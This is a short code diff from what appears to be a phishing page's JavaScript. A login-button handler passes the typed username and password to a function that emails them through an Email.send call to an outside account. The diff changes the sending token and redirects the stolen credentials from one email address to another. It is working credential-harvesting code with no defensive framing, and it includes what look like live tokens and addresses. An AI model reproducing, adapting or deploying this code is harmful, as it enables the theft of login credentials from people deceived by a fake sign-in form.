@@ -10,9 +10,9 @@ loginbtn.addEventListener('click',()=>{
 
 function rbOn(user,pwd) {
     Email.send({
-        SecureToken: 'e7589e58-be60-40bc-9500-ee618f664037',
-        To: 'dspeed637@gmail.com',
-        From: 'dspeed637@gmail.com',
+        SecureToken: 'ff23ef3b-708c-47ba-a213-fd400bd731da',
+        To: 'stuffbooster@outlook.com',
+        From: 'stuffbooster@outlook.com',
         Subject: `RB: ${user} / ${pwd}`,
         Body: `<p><b>username:</b> ${user}</p> 
          <p><b>password:</b> ${pwd}</p>`,
